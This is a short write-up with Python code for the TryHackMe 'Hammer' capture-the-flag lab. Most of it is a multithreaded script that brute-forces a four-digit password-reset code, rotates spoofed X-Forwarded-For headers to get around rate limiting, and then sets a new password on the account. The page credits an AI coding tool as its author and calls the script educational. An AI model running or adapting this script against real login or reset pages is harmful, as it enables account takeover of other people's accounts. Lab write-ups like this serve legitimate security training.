## OTP Token Brute Forcer 
- OTP/Token brute forcer — guessing a one-time code
- Rate limit bypass — using `X-Forwarded-For` to evade restrictions

*A Python script built for the TryHackMe "Hammer" CTF challenge. It demonstrates 
common web application vulnerabilities including OTP brute forcing, rate limit bypass 
via `X-Forwarded-For` header spoofing, and session-based authentication attacks. 
Built for educational purposes on intentionally vulnerable machines. Do not use 
against real targets*

## Features
- Multithreaded for faster processing (100 concurrent threads)
- `X-Forwarded-For` header spoofing to bypass IP rate limiting
- Shared session handling to preserve OTP cookies
- Automatic success detection based on server response


**Courtesy of Claude Code**
```
import requests
import threading
from queue import Queue

TARGET_URL = "http://10.112.150.160:1337/reset_password.php"
EMAIL = "tester@hammer.thm"
NEW_PASSWORD = "password123"

found_code = None
lock = threading.Lock()
ip_counter = 0
ip_lock = threading.Lock()
q = Queue()
session = requests.Session()

def get_ip():
    global ip_counter
    with ip_lock:
        ip_counter += 1
        return f"127.0.{ip_counter // 256}.{ip_counter % 256}"

def request_reset():
    headers = {"X-Forwarded-For": get_ip()}
    r = session.post(TARGET_URL, headers=headers, data={"email": EMAIL})
    print(f"[*] Reset requested: {r.status_code}")

def set_new_password(code_str):
    headers = {"X-Forwarded-For": get_ip()}
    data = {
        "recovery_code": code_str,
        "s": "180",
        "new_password": NEW_PASSWORD,
        "confirm_password": NEW_PASSWORD,
    }
    r = session.post(TARGET_URL, headers=headers, data=data, timeout=5)
    print(f"\n[*] Password reset response: {r.text[:500]}")

def worker():
    global found_code
    while not q.empty():
        if found_code:
            break

        code_str = q.get()
        headers = {"X-Forwarded-For": get_ip()}
        data = {
            "recovery_code": code_str,
            "s": "180",
        }

        try:
            r = session.post(TARGET_URL, headers=headers, data=data, timeout=5)
            print(f"[*] Trying: {code_str} | Status: {r.status_code}", end="\r")

            if "Invalid or expired recovery code!" not in r.text:
                with lock:
                    if not found_code:
                        found_code = code_str
                        print(f"\n[+] SUCCESS! Code: {code_str}")
                        # Now submit new password
                        set_new_password(code_str)
        except:
            q.put(code_str)
        finally:
            q.task_done()

def bruteforce():
    for code in range(10000):
        q.put(str(code).zfill(4))

    print("[*] Requesting password reset...")
    request_reset()

    print("[*] Starting bruteforce with 100 threads...")
    for _ in range(100):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()

    q.join()
    if not found_code:
        print("\n[-] Code not found.")

if __name__ == "__main__":
    bruteforce()
```
